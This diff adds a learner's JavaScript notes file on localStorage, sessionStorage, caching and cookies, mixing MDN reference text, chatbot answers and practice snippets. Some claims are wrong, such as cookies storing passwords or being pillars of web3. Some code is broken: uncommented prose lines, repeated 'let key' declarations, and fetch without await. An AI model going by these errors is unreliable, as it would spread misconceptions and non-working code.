@@ -1,0 +1,4716 @@
+console.log("localStorage , sessionstorage  and caching in js ")
+
+console.log("crucial info")
+// Window: localStorage property
+// The localStorage read-only property of the window interface 
+// allows you to access a Storage object for the Document's 
+// origin; the stored data is saved across browser sessions.
+
+// localStorage is similar to sessionStorage, except that 
+// while localStorage data has no expiration time, 
+// sessionStorage data gets cleared when the page 
+// session ends — that is, when the page is closed. 
+// (localStorage data for a document loaded in a 
+// "private browsing" or "incognito" session is 
+// cleared when the last "private" tab is closed.)
+
+// Value
+// A Storage object which can be used to access 
+// the current origin's local storage space.
+
+// Description
+// The keys and the values stored with localStorage 
+// are always in the UTF-16 string format, which uses 
+// two bytes per character. As with objects, integer 
+// keys are automatically converted to strings.
+
+// localStorage data is specific to the protocol of 
+// the document. In particular, for a site loaded 
+// over HTTP (e.g., http://example.com), localStorage 
+// returns a different object than localStorage for 
+// the corresponding site loaded over HTTPS (e.g., https://example.com).
+
+// For documents loaded from file: URLs (that 
+// is, files opened in the browser directly from 
+// the user's local filesystem, rather than being 
+// served from a web server) the requirements for 
+// localStorage behavior are undefined and may 
+// vary among different browsers.
+
+// In all current browsers, localStorage seems to 
+// return a different object for each file: URL. 
+// In other words, each file: URL seems to have 
+// its own unique local-storage area. But there 
+// are no guarantees about that behavior, so you 
+// shouldn't rely on it because, as mentioned above, 
+// the requirements for file: URLs remain undefined. 
+// So it's possible that browsers may change their 
+// file: URL handling for localStorage at any time. 
+// In fact some browsers have changed their handling 
+// for it over time.
+
+
+
+console.log("localstorage in js")
+
+// i think localstorage and sessionstorage is a parts of caching .
+//  Not exactly. While `localStorage` and `sessionStorage` 
+//are used to store data in the browser, they are not part 
+//of caching in the traditional sense¹².
+// Here's a brief explanation:
+// - **Caching**: This is a technique used by browsers to 
+//store frequently accessed web content (like web pages, 
+//images, etc.) to improve performance. When you revisit a 
+//cached website, the browser can load it from the cache instead 
+//of making a network request, making the page load faster¹.
+// - **localStorage**: This is a type of web storage that 
+//allows JavaScript sites and apps to store and access data 
+//right in the browser with no expiration time. This means 
+//the data stored in the browser will persist even after the 
+//browser window has been closed¹².
+// - **sessionStorage**: Similar to localStorage, but it 
+//stores data for one session (the data is lost when the 
+//browser tab is closed)¹².
+// So, while they all involve storing data in the browser, 
+//caching is typically managed by the browser itself (to 
+//store web content), while `localStorage` and `sessionStorage` 
+//are methods provided by the Web Storage API for developers 
+//to store and manage data within the user's browser¹². They 
+//serve different purposes and are used in different scenarios. 
+//If you have any other questions, feel free to ask! 😊
+
+console.log("and what is cookie ? ")
+// cookie is the user-specific details / that user-info 
+// like user preferences , passwords etc, that get stored 
+// in user's device memory to better the user experience . 
+// also the cookie do have a expiry time , which also 
+// makes cookie memory efficient an remember that cookies 
+// are one of the important pillers of what web3 is today .
+// and we can access the cookie in our device using ,
+// document.cookie 
+
+
+console.log("what is cache? - defination")
+// A cache, in computing, is a hardware or software 
+// component that stores data so that future requests 
+// for that data can be served faster². The data stored 
+// in a cache might be the result of an earlier computation 
+// or a copy of data stored elsewhere². 
+// the purpose of a cache is to increase 
+// efficiency by storing important or frequently used items 
+// in a place where they can be accessed quickly. 
+// In the context of computers, when the requested data 
+// can be found in the cache, it's called a cache hit, 
+// while if it cannot be found, it's called a cache miss². 
+// Cache hits are served by reading data from the cache, 
+// which is faster than recomputing a result or reading 
+// from a slower data store²..
+
+
+let key = prompt("Enter key you want to set")
+let value = prompt("Enter value you want to set")
+
+localStorage.setItem(key, value)
+
+console.log(`The value at ${key} is ${localStorage.getItem(key)}`)
+
+if (key == "red" || key == "blue") {
+        localStorage.removeItem(key)
+}
+
+if (key == 0) {
+        localStorage.clear()
+}
+
+
+// localstorage methods- Yes, the localStorage object 
+// in JavaScript provides four main methods
+
+// Sure, here are the main methods you can use with `localStorage`¹²³⁴⁵:
+// 1. **setItem(key, value)**: This method is used to add a 
+//key-value pair to localStorage¹²³⁴⁵.
+// ```javascript
+localStorage.setItem('myKey', 'myValue');
+// ```
+// 2. **getItem(key)**: This method is used to retrieve a 
+//value from localStorage using its key¹²³⁴⁵.
+// ```javascript
+let value2 = localStorage.getItem('myKey');
+// ```
+// 3. **removeItem(key)**: This method is used to remove 
+//a key-value pair from localStorage using its key¹²³⁴⁵.
+// ```javascript
+localStorage.removeItem('myKey');
+// ```
+// 4. **clear()**: This method is used to clear all key-value
+// pairs from localStorage¹²³⁴⁵.
+// ```javascript
+localStorage.clear();
+// ```
+// Remember, The data will not be deleted when the browser is closed, and will 
+//be available for future browsing sessions¹²³⁴⁵. the stored 
+// data is saved across browser sessions.
+
+loaclstorage api is part of window api . 
+which follows hierarchy like this - 
+.Web_Api-----> Document Object Model (DOM OR DOM API) ---------> window api -------> localstorage and sessionstorage api
+
+// session storage api 
+// Window: sessionStorage property
+
+// The read-only sessionStorage 
+// property accesses a session 
+// Storage object for the current 
+// origin. sessionStorage is similar 
+// to localStorage; the difference is 
+// that while data in localStorage 
+// doesn't expire, data in sessionStorage 
+// is cleared when the page session ends.
+
+// Whenever a document is loaded in 
+// a particular tab in the browser, 
+// a unique page session gets created 
+// and assigned to that particular tab. 
+// That page session is valid only for 
+// that particular tab.
+
+// A page session lasts as long as 
+// the tab or the browser is open, 
+// and survives over page reloads and restores.
+
+// Opening a page in a new tab or 
+// window creates a new session with 
+// the value of the top-level browsing
+//  context, which differs from how 
+// session cookies work.
+
+// Opening multiple tabs/windows with 
+// the same URL creates sessionStorage 
+// for each tab/window.
+
+// Duplicating a tab copies the tab's 
+// sessionStorage into the new tab.
+
+// Closing a tab/window ends the 
+// session and clears objects in sessionStorage.
+
+// Data stored in sessionStorage is 
+// specific to the protocol of the 
+// page. In particular, data stored 
+// by a script on a site accessed 
+// with HTTP (e.g., http://example.com) 
+// is put in a different sessionStorage 
+// object from the same site accessed 
+// with HTTPS (e.g., https://example.com).
+
+// The keys and the values are always 
+// in the UTF-16 string format, which 
+// uses two bytes per character. As with 
+// objects, integer keys are automatically 
+// converted to strings.
+
+// Value
+// A Storage object which can be used 
+// to access the current origin's 
+// session storage space.
+
+// Exceptions
+// SecurityError
+// Thrown in one of the following cases:
+
+// The origin is not a valid 
+// scheme/host/port tuple. This 
+// can happen if the origin uses 
+// the file: or data: schemes, for example.
+
+// The request violates a policy decision. 
+// For example, the user has configured 
+// the browsers to prevent the page 
+// from persisting data.
+
+// Note that if the user blocks cookies, 
+// browsers will probably interpret 
+// this as an instruction to prevent 
+// the page from persisting data.
+
+// Examples
+// Basic usage
+// Save data to sessionStorage
+sessionStorage.setItem("key", "value");
+
+// Get saved data from sessionStorage
+let data = sessionStorage.getItem("key");
+
+// Remove saved data from sessionStorage
+sessionStorage.removeItem("key");
+
+// Remove all saved data from sessionStorage
+sessionStorage.clear();
+// Saving text between refreshes
+// The following example autosaves 
+// the contents of a text field, and 
+// if the browser is refreshed, restores 
+// the text field content so that no 
+// writing is lost.
+
+// Get the text field that we're going to track
+let field = document.getElementById("field");
+
+// See if we have an autosave value
+// (this will only happen if the page is accidentally refreshed)
+if (sessionStorage.getItem("autosave")) {
+  // Restore the contents of the text field
+  field.value = sessionStorage.getItem("autosave");
+}
+
+// Listen for changes in the text field
+field.addEventListener("change", () => {
+  // And save the results into the session storage object
+  sessionStorage.setItem("autosave", field.value);
+});
+// Note: Please refer to the Using 
+// the Web Storage API article for
+//  a full example.
+
+// storage api 
+// instance property 
+// Storage: length property
+// The length read-only property of the 
+// Storage interface returns the number 
+// of data items stored in a given Storage object.
+
+// Value
+// The number of items stored in the Storage object.
+
+// Examples
+// The following function adds three data 
+// items to the local storage for the 
+// current domain, then returns the 
+// number of items in the storage:
+
+// JS
+// Copy to Clipboard
+function populateStorage() {
+  localStorage.setItem("bgcolor", "yellow");
+  localStorage.setItem("font", "Helvetica");
+  localStorage.setItem("image", "cats.png");
+
+  return localStorage.length; // Should return 3
+}
+// Note: For a real-world example, see our Web Storage Demo.
+// https://mdn.github.io/dom-examples/web-storage/
+
+// Storage: getItem() method
+// The getItem() method of the Storage 
+// interface, when passed a key name, will
+//  return that key's value, or null if the
+//  key does not exist, in the given Storage object.
+
+// Syntax
+getItem(keyName)
+// Parameters
+// keyName
+// A string containing the name of the
+//  key you want to retrieve the value of.
+
+// Return value
+// A string containing the value of the key.
+//  If the key does not exist, null is returned.
+
+// Examples
+// The following function retrieves three data
+//  items from local storage, then uses them 
+// to set custom styles on a page.
+
+// JS
+// Copy to Clipboard
+function setStyles() {
+  const currentColor = localStorage.getItem("bgcolor");
+  const currentFont = localStorage.getItem("font");
+  const currentImage = localStorage.getItem("image");
+
+  document.getElementById("bgcolor").value = currentColor;
+  document.getElementById("font").value = currentFont;
+  document.getElementById("image").value = currentImage;
+
+  htmlElem.style.backgroundColor = `#${currentColor}`;
+  pElem.style.fontFamily = currentFont;
+  imgElem.setAttribute("src", currentImage);
+}
+// Note: To see this used within a real-world example, see our Web Storage Demo.
+// https://mdn.github.io/dom-examples/web-storage/
+
+
+// Storage: key() method
+// The key() method of the Storage interface,
+//  when passed a number n, returns the 
+// name of the nth key in a given Storage
+//  object. The order of keys is user-agent 
+// defined, so you should not rely on it.
+
+// Syntax
+key(index)
+// Parameters
+// index
+// An integer representing the number of the
+//  key you want to get the name of. This 
+// is a zero-based index.
+
+// Return value
+// A string containing the name of the key. 
+// If the index does not exist, null is returned.
+
+// Examples
+// The following function iterates over the local storage keys:
+
+function forEachKey(callback) {
+  for (let i = 0; i < localStorage.length; i++) {
+    callback(localStorage.key(i));
+  }
+}
+// The following function iterates over 
+// the local storage keys and gets the 
+// value set for each key:
+
+for (let i = 0; i < localStorage.length; i++) {
+  console.log(localStorage.getItem(localStorage.key(i)));
+}
+// Note: For a real-world example, see our Web Storage Demo.
+
+// Storage: removeItem() method
+// The removeItem() method of the Storage 
+// interface, when passed a key name, 
+// will remove that key from the given
+//  Storage object if it exists. The 
+// Storage interface of the Web Storage
+//  API provides access to a particular
+//  domain's session or local storage.
+
+// If there is no item associated with 
+// the given key, this method will do nothing.
+
+// Syntax
+removeItem(keyName)
+// Parameters
+// keyName
+// A string containing the name of
+//  the key you want to remove.
+
+// Return value
+// None (undefined).
+
+// Examples
+// The following function creates three data
+//  items inside local storage, then 
+// removes the image data item.
+
+// JS
+// Copy to Clipboard
+function populateStorage() {
+  localStorage.setItem("bgcolor", "red");
+  localStorage.setItem("font", "Helvetica");
+  localStorage.setItem("image", "myCat.png");
+
+  localStorage.removeItem("image");
+}
+// We can do the same for the session storage.
+
+// JS
+// Copy to Clipboard
+function populateStorage() {
+  sessionStorage.setItem("bgcolor", "red");
+  sessionStorage.setItem("font", "Helvetica");
+  sessionStorage.setItem("image", "myCat.png");
+  sessionStorage.removeItem("image");
+}
+
+// Storage: setItem() method
+// The setItem() method of the Storage
+//  interface, when passed a key name and
+//  value, will add that key to the given
+//  Storage object, or update that key's 
+// value if it already exists.
+
+// Syntax
+setItem(keyName, keyValue)
+// Parameters
+// keyName
+// A string containing the name of 
+// the key you want to create/update.
+
+// keyValue
+// A string containing the value you 
+// want to give the key you are creating/updating.
+
+// Return value
+// None (undefined).
+
+// Exceptions
+// QuotaExceededError DOMException
+// Thrown if the storage run out of 
+// disk quota or the user declined to
+//  grant you more space.
+
+// Examples
+// The following function creates 
+// three data items inside local storage.
+
+function populateStorage() {
+  localStorage.setItem("bgcolor", "red");
+  localStorage.setItem("font", "Helvetica");
+  localStorage.setItem("image", "myCat.png");
+}
+// Note: To see this used within a 
+// real-world example, see our Web Storage Demo.
+
+// Storage only supports storing 
+// and retrieving strings. If you 
+// want to save other data types, 
+// you have to convert them to strings.
+//  For plain objects and arrays, you 
+// can use JSON.stringify().
+
+const person = { name: "Alex" };
+localStorage.setItem("user", person);
+console.log(localStorage.getItem("user")); // "[object Object]"; not useful!
+localStorage.setItem("user", JSON.stringify(person));
+console.log(JSON.parse(localStorage.getItem("user"))); // { name: "Alex" }
+// However, there's no generic way to 
+// store arbitrary data types. Furthermore, 
+// the retrieved object is a deep copy of 
+// the original object and mutations to it 
+// do not affect the original object.
+
+
+// Storage: clear() method
+// The clear() method of the Storage 
+// interface clears all keys stored 
+// in a given Storage object.
+
+// Syntax
+clear()
+// Parameters
+// None.
+
+// Return value
+// None (undefined).
+
+// Examples
+// The following function creates three 
+// data entries in local storage, and 
+// then deletes them by using clear().
+
+function populateStorage() {
+  localStorage.setItem("bgcolor", "red");
+  localStorage.setItem("font", "Helvetica");
+  localStorage.setItem("image", "miGato.png");
+
+  localStorage.clear();
+}
+// Note: For a real-world example, see our Web Storage Demo.
+// https://mdn.github.io/dom-examples/web-storage/
+
+
+
+// storageEvent Api 
+// StorageEvent: StorageEvent() constructor
+// The StorageEvent() constructor 
+// creates a new StorageEvent object.
+
+// Syntax
+new StorageEvent(type)
+new StorageEvent(type, options)
+// Parameters
+// type
+// A string with the name of the type of 
+// the StorageEvent. It is case-sensitive 
+// and browsers set it to storage.
+
+// options Optional
+// An object that, in addition of the
+//  properties defined in Event(), 
+// has the following properties:
+
+// key Optional
+// A string that represents the key 
+// for the storage item that changed. 
+// Defaults to null.
+
+// oldValue Optional
+// A string containing the original 
+// value of the storage item. Defaults to null.
+
+// newValue Optional
+// A string with the new value of 
+// the key. Defaults to null.
+
+// url
+// A string with the URL of the 
+// document whose storage changed.
+
+// storageArea Optional
+// A Storage object that represents the 
+// storage that was affected. Defaults to null.
+
+// Return value
+// A new StorageEvent object.
+
+// inheritence -> event api 
+
+// cookies 
+// fully flexed 
+
+
+console.log("cookies in js ")
+// what do yu know about cookies in js ?
+// cookies are user-specific details that keep track of the 
+// user-details and user-preferences , they ares stores 
+//inside the browser memory . 
+// cookie has their expire daae attched to it which expires 
+//with time 
+// and are also memory efficient and cookies works session-wise .
+
+
+
+console.log("cookie vs cache ")
+// difference between cache and cookie ? 
+// Yes, both cache and cookies are used to enhance website 
+//performance and make it more accessible by storing some 
+//data on the client-side machine. However, they serve 
+//different purposes and work in different ways:
+// - **Cache**: A cache stores web page resources in a 
+//browser for future use, which decreases the website's 
+//future loading time¹. The cache stores contents like HTML 
+//pages, images, JavaScript, CSS, etc¹. The content of the 
+//website is saved only on the browser¹. Caches are less 
+//memory efficient¹ and they expire manually¹.
+// - **Cookies**: Cookies store user-specific details like 
+//browsing session information, preferred web pages, and more¹. 
+//Cookies use this information to track user preferences and 
+//interests¹. The content of the website is saved on both the 
+//server and the browser¹. Cookies are more memory efficient¹
+// and they expire automatically¹.
+// So, in summary, a cache is used to store website content 
+//to decrease loading time, while cookies are used to store 
+///user choices and track user preferences¹. 😊
+
+
+
+
+console.log("importance of cookies in modern web")
+// Cookies are essential for the modern web for several reasons:
+// 1. **Personalization**: Cookies remember your preferences,
+// making your web browsing experience more personalized³.
+// 2. **Session Management**: They help maintain your session, 
+//which means you don't have to log in every time you visit a site³.
+// 3. **Tracking**: Cookies help websites understand user behavior,
+// which can be used to improve the user experience⁴.
+// 4. **E-commerce**: They enable features like shopping carts 
+//in online stores².
+// In short, cookies make the internet more convenient and 
+//personalized for users, and more informative for website 
+//owners¹²³⁴⁵.
+
+
+console.log("set and expiry of cookie")
+// how to set cookie . 
+// In JavaScript, you can use the `document.cookie` property
+// to create a cookie. Here's an example of how to set a cookie:
+// ```javascript
+document.cookie = "username=John Doe";
+// ```
+// In this example, `"username=John Doe"` is a string that 
+//specifies the cookie's name and value¹.
+// You can also add an expiry date to the cookie. By default, 
+//the cookie is deleted when the browser is closed. If you 
+//want the cookie to expire at a certain date, you can use 
+//the `expires` attribute:
+// ```javascript
+document.cookie = "username=John Doe; expires=Thu, 18 Dec 2023 12:00:00 UTC";
+// ```
+// In this example, the cookie will expire on December 18, 2023¹.
+// If you want the cookie to be available for all paths in your
+// domain, you can use the `path` attribute:
+// ```javascript
+document.cookie = "username=John Doe; expires=Thu, 18 Dec 2023 12:00:00 UTC; path=/";
+// ```
+// In this example, the cookie is available for all pages on 
+//the website¹.
+// Remember, the exact details of your cookie (like its name, 
+//value, expiry date, and path) will depend on what you're 
+//trying to achieve with it¹. 😊
+console.log(document.cookie) 
+// _ga_0EB7PKQMBX=GS1.1.1682746964.2.1.1682746983.0.0.0; ab.storage.sessionId.a9882122-ac6c-486................
+
+// The information you’re seeing is not “bullshit”, but rather
+// it’s the data stored in the cookies of your web browser. 
+//Cookies are small files of information that a web server 
+//generates and sends to a web browser
+// In your case, the _ga_0EB7PKQMBX seems to be a Google 
+//Analytics cookie, which is used to distinguish unique users
+// by assigning a randomly generated number as a client 
+//identifier. The ab.storage.sessionId.a9882122-ac6c-486... 
+//could be a session identifier used to associate your current 
+//session with server-side data.
+
+// Remember, cookies are essential for the web to function as 
+//it does today. They enable a myriad of features, from 
+//remembering your login information, to helping websites 
+//deliver content that is relevant to you5. So, while it might 
+//seem like “bullshit”, it’s actually quite important! 😊
+
+// tht's all is good and ok .. but i want to see the cookie i 
+//stored how can i see it  using code in the console ?
+// You can view the cookies stored for the current website 
+//directly in your browser's JavaScript console using the 
+//`document.cookie` command¹⁵. Here's how you can do it:
+
+// 1. Open your browser's developer tools. You can usually 
+//do this by right-clicking on the webpage and selecting 
+//"Inspect" or "Inspect Element".
+// 2. Navigate to the "Console" tab.
+// 3. In the console, type `console.log(document.cookie)`
+// and press Enter.
+
+// This will print out a string with all the cookies for 
+//the current webpage. The cookies are separated by semicolons
+// and each cookie is represented as a key-value pair¹.
+// Please note that due to security concerns, you can only
+// access cookies from the same domain. When you run 
+//something from the console, it's the equivalent of it 
+//running directly from the page¹. So, you won't be able to 
+//access cookies from a different domain.
+// Here's an example of how you can use it:
+// ```javascript
+console.log(document.cookie);
+// ```
+// This will print out something like this:
+// ```javascript
+// "_ga=GA1.2.1929736587.1607410386; _gid=GA1.2.1764179734.1607410386; ..."
+// ```
+// Each part before the `=` is the name of a cookie, and each 
+//part after the `=` is the value of the cookie¹.
+// Remember, the output might vary based on the cookies 
+//stored for the website in your browser. If you have any 
+//other questions, feel free to ask! 😊
+// this is what its printing in the console via 
+//console.log(document.cookie) -
+// _ga_0EB7PKQMBX=GS1.1.16827469....; 1=ALoke; 
+//null=null- where is my cookie ?
+
+
+document.cookie = "name=harry"
+let key = prompt("enter your key")
+let value = prompt("enter your value")
+document.cookie = 
+`${encodeURIComponent(key)}=${encodeURIComponent(value)}`
+console.log(document.cookie)
+// _ga_0EB7PKQMBX=GS1.1.1682746964.2.1.1682746983.0.0.0; 
+//ab.storage.sessionId.a9882122-ac6c-.............................
+
+// how to expire a cookie 
+document.cookie = "name=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+
+// In this example, the `expires` attribute is set to 
+//`Thu, 01 Jan 1970 00:00:00 UTC`, which is a date in the past. 
+//This will cause the browser to immediately expire the cookie.
+// Remember, if you set a cookie at a specific path, you'll 
+//need to provide the same path when you expire the cookie. 
+//In the example above, the path is set to `/`, which is the 
+//root path. If your cookie was set at a different path, 
+//you'll need to replace `/` with the correct path.
+// I hope this helps! 😊
+
+// so to conclude , 
+console.log(document.cookie)
+document.cookie = "name=harry1122334400"
+document.cookie = "name2=harry11223344002"
+document.cookie = "name=harry"
+let key = prompt("enter your key")
+let value = prompt("enter your value")
+document.cookie = `${encodeURIComponent(key)}=${encodeURIComponent(value)}`
+console.log(document.cookie)
+
+
+
+console.log("syntax of cookies and extraction of cookie in the console")
+// The cookies you're seeing are all the cookies currently 
+//stored for the website you're on. Each cookie is represented 
+//as a key-value pair, separated by semicolons. 
+
+// If you're looking for a specific cookie you've set, you'll 
+//need to know the name of the cookie. From your console output,
+// it seems like the cookies currently stored include 
+//`_ga_0EB7PKQMBX`, 
+//`ab.storage.sessionId.a9882122-ac6c-486a-bc3b-fab39ef624c5`,
+// `ab.storage.deviceId.a9882122-ac6c-486a-bc3b-fab39ef624c5`
+//, `ab.storage.userId.a9882122-ac6c-486a-bc3b-fab39ef624c5`,
+// `amp_6e403e`, `1`, and `null`.
+
+// If you're trying to find a cookie you've set with a 
+//specific name, you can use the following code in your 
+//console:
+
+// ```javascript
+console.log(document.cookie.split('; ').find(row => row.startsWith('yourCookieName=')));
+// ```
+
+// Replace `'yourCookieName='` with the name of your cookie. 
+//This will return the cookie with that name, if it exists.
+
+// Remember, due to security restrictions, you can only 
+//access cookies from the same domain. If you're trying to
+// access a cookie from a different domain, or a cookie that 
+//has the `HttpOnly` attribute set, you won't be able to 
+//access it through `document.cookie`.
+
+// If you have any other questions, feel free to ask! 😊
+
+// so inconsole , 
+console.log(document.cookie.split('; ')
+.find(row => row.startsWith(1)));
+//  1=ALoke
+// here is our cookie . 
+
+console.log("one more example")
+
+// using fetch with try /catch block
+try{
+    let data =  fetch("https://jsonplaceholder.typicode.com/todos/")
+    let actualData = data.json()
+    console.log(actualData)
+}catch(error){
+    console.log(error)
+}
+
+console.log(document.cookie,typeof document.cookie) // string
+document.cookie = "name = Aloke"
+// note that cookies are stored in a key = value 
+//  format , and every cookie is seperated by ;/semicolon 
+// so if we want to get and see our cookie we need to do something like 
+// and cookie is a string 
+let ky = "name"
+let valu = "God"
+document.cookie =  `${encodeURIComponent(ky)}=${encodeURIComponent(valu)}`
+console.log(document.cookie)
+
+let myNmae = "Aloek"
+console.log(myNmae.split("")) // array // ['A', 'l', 'o', 'e', 'k']
+// which means split is an string method 
+// and document.cookie is  a string so
+// we can do 
+console.log(document.cookie.split(";").find(string => string.startsWith(" name")))
+// name=god
+
+// mdn 
+console.log("Cookie")
+
+// The Cookie HTTP request header 
+// contains stored HTTP cookies 
+// associated with the server 
+// (i.e. previously sent by the 
+// server with the Set-Cookie 
+// header or set in JavaScript 
+// using Document.cookie).
+
+// The Cookie header is optional 
+// and may be omitted if, for 
+// example, the browser's privacy 
+// settings block cookies.
+
+// Header type	                Request header
+// Forbidden header name	    yes
+
+
+// Syntax
+// HTTP
+// Copy to Clipboard
+// Cookie: <cookie-list>
+// Cookie: name=value
+// Cookie: name=value; name2=value2; name3=value3
+// Directives
+// <cookie-list>
+// A list of name-value pairs in the form 
+// of <cookie-name>=<cookie-value>. 
+// Pairs in the list are separated 
+// by a semicolon and a space ('; ').
+
+// Examples
+// HTTP
+// Copy to Clipboard
+// Cookie: PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1
+
+
+console.log("Set-Cookie")
+// The Set-Cookie HTTP response header is 
+// used to send a cookie from the server 
+// to the user agent, so that the user 
+// agent can send it back to the server 
+// later. To send multiple cookies, 
+// multiple Set-Cookie headers should 
+// be sent in the same response.
+
+// Warning: Browsers block frontend 
+// JavaScript code from accessing 
+// the Set-Cookie header, as required 
+// by the Fetch spec, which defines 
+// Set-Cookie as a forbidden 
+// response-header name that must 
+// be filtered out from any response 
+// exposed to frontend code.
+
+// For more information, see 
+// the guide on Using HTTP cookies.
+
+// Header type	                            Response header
+// Forbidden header name	                no
+// Forbidden response header name	        yes
+
+// Syntax
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: <cookie-name>=<cookie-value>
+// Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
+// Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
+// Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
+// Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<number>
+// Set-Cookie: <cookie-name>=<cookie-value>; Partitioned
+// Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
+// Set-Cookie: <cookie-name>=<cookie-value>; Secure
+
+// Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Strict
+// Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Lax
+// Set-Cookie: <cookie-name>=<cookie-value>; SameSite=None; Secure
+// Multiple attributes are also possible, for example:
+// Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
+
+// Attributes
+// <cookie-name>=<cookie-value>
+// Defines the cookie name and its value. 
+// A cookie definition begins with a name-value pair.
+
+// A <cookie-name> can contain any 
+// US-ASCII characters except for: 
+// control characters (ASCII characters 
+// 0 up to 31 and ASCII character 127) 
+// or separator characters (space, tab 
+// and the characters: ( ) < > @ , ; : \ " / [ ] ? = { })
+
+// A <cookie-value> can optionally 
+// be wrapped in double quotes and 
+// include any US-ASCII character 
+// excluding control characters 
+// (ASCII characters 0 up to 31 
+// and ASCII character 127), 
+// Whitespace, double quotes, 
+// commas, semicolons, and backslashes.
+
+// Encoding: Many implementations 
+// perform URL encoding on cookie values. 
+// However, this is not required by the 
+// RFC specification. The URL encoding 
+// does help to satisfy the requirements 
+// of the characters allowed for <cookie-value>.
+
+// Note: Some <cookie-name> have a 
+// specific semantic:
+
+// __Secure- prefix: Cookies with names 
+// starting with __Secure- (dash is part 
+// of the prefix) must be set with the 
+// secure flag from a secure page (HTTPS).
+
+// __Host- prefix: Cookies with names 
+// starting with __Host- must be set 
+// with the secure flag, must be from 
+// a secure page (HTTPS), must not 
+// have a domain specified (and therefore, 
+// are not sent to subdomains), and 
+// the path must be /.
+
+// Domain=<domain-value> Optional
+// Defines the host to which the cookie will be sent.
+
+// Only the current domain can be set 
+// as the value, or a domain of a higher 
+// order, unless it is a public suffix. 
+// Setting the domain will make the 
+// cookie available to it, as well 
+// as to all its subdomains.
+
+// If omitted, this attribute defaults 
+// to the host of the current document 
+// URL, not including subdomains.
+
+// Contrary to earlier specifications, 
+// leading dots in domain names 
+// (.example.com) are ignored.
+
+// Multiple host/domain values are 
+// not allowed, but if a domain is 
+// specified, then subdomains are 
+// always included.
+
+// Expires=<date> Optional
+// Indicates the maximum lifetime of 
+// the cookie as an HTTP-date timestamp. 
+// See Date for the required formatting.
+
+// If unspecified, the cookie becomes 
+// a session cookie. A session finishes 
+// when the client shuts down, after
+//  which the session cookie is removed.
+
+// Warning: Many web browsers have 
+// a session restore feature that 
+// will save all tabs and restore 
+// them the next time the browser 
+// is used. Session cookies will 
+// also be restored, as if the 
+// browser was never closed.
+
+// When an Expires date is set, 
+// the deadline is relative to 
+// the client the cookie is 
+// being set on, not the server.
+
+// HttpOnly Optional
+// Forbids JavaScript from accessing 
+// the cookie, for example, through 
+// the Document.cookie property. Note 
+// that a cookie that has been created 
+// with HttpOnly will still be sent with 
+// JavaScript-initiated requests, for 
+// example, when calling 
+// XMLHttpRequest.send() or fetch(). 
+// This mitigates attacks against 
+// cross-site scripting (XSS).
+// 
+
+// Max-Age=<number> Optional
+// Indicates the number of seconds 
+// until the cookie expires. A zero 
+// or negative number will expire the 
+// cookie immediately. If both Expires 
+// and Max-Age are set, Max-Age has precedence.
+
+// Partitioned OptionalExperimental
+// Indicates that the cookie should be 
+// stored using partitioned storage. 
+// See Cookies Having Independent 
+// Partitioned State (CHIPS) for more details.
+
+// Path=<path-value> Optional
+// Indicates the path that must exist 
+// in the requested URL for the browser 
+// to send the Cookie header.
+
+// The forward slash (/) character is 
+// interpreted as a directory separator, 
+// and subdirectories are matched as well. 
+// For example, for Path=/docs,
+
+// the request paths /docs, /docs/, /docs/Web/, and /docs/Web/HTTP will all match.
+// the request paths /, /docsets, /fr/docs will not match.
+
+// SameSite=<samesite-value> Optional
+// Controls whether or not a cookie is 
+// sent with cross-site requests, 
+// providing some protection against 
+// cross-site request forgery attacks (CSRF).
+
+// The possible attribute values are:
+
+// Strict
+// Means that the browser sends the 
+// cookie only for same-site requests,
+//  that is, requests originating from 
+// the same site that set the cookie. 
+// If a request originates from a 
+// different domain or scheme (even 
+// with the same domain), no cookies 
+// with the SameSite=Strict attribute are sent.
+
+// Lax
+// Means that the cookie is not sent 
+// on cross-site requests, such as on 
+// requests to load images or frames, 
+// but is sent when a user is navigating 
+// to the origin site from an external 
+// site (for example, when following a link). 
+// This is the default behavior if the 
+// SameSite attribute is not specified.
+
+// None
+// Means that the browser sends the 
+// cookie with both cross-site and 
+// same-site requests. The Secure 
+// attribute must also be set when 
+// setting this value, like so 
+// SameSite=None; Secure. If Secure 
+// is missing an error will be logged:
+
+// Cookie "myCookie" rejected because 
+// it has the "SameSite=None" attribute 
+// but is missing the "secure" attribute.
+
+// This Set-Cookie was blocked because 
+// it had the "SameSite=None" attribute 
+// but did not have the "Secure" attribute, 
+// which is required in order to use "SameSite=None".
+
+// Note: A Secure cookie is only sent to 
+// the server with an encrypted request 
+// over the HTTPS protocol. Note that 
+// insecure sites (http:) can't set 
+// cookies with the Secure directive, 
+// and therefore can't use SameSite=None.
+
+// Secure Optional
+// Indicates that the cookie is sent 
+// to the server only when a request 
+// is made with the https: scheme 
+// (except on localhost), and therefore, 
+// is more resistant 
+// to man-in-the-middle attacks.
+
+// Note: Do not assume that Secure 
+// prevents all access to sensitive 
+// information in cookies (session keys, 
+// login details, etc.). Cookies with 
+// this attribute can still be 
+// read/modified either with access 
+// to the client's hard disk or from 
+// JavaScript if the HttpOnly cookie 
+// attribute is not set.
+
+// Insecure sites (http:) cannot 
+// set cookies with the Secure 
+// attribute (since Chrome 52 and 
+// Firefox 52). The https: requirements 
+// are ignored when the Secure attribute 
+// is set by localhost (since 
+// Chrome 89 and Firefox 75).
+
+// Examples
+// Session cookie
+// Session cookies are removed when 
+// the client shuts down. Cookies are 
+// session cookies if they do not 
+// specify the Expires or Max-Age attribute.
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: sessionId=38afes7a8
+// Permanent cookie
+// Permanent cookies are removed at 
+// a specific date (Expires) or after 
+// a specific length of time (Max-Age) 
+// and not when the client is closed.
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: id=a3fWa; Max-Age=2592000
+// Invalid domains
+// A cookie for a domain that does not 
+// include the server that set it
+//  should be rejected by the user agent.
+
+// The following cookie will be rejected 
+// if set by a server hosted on 
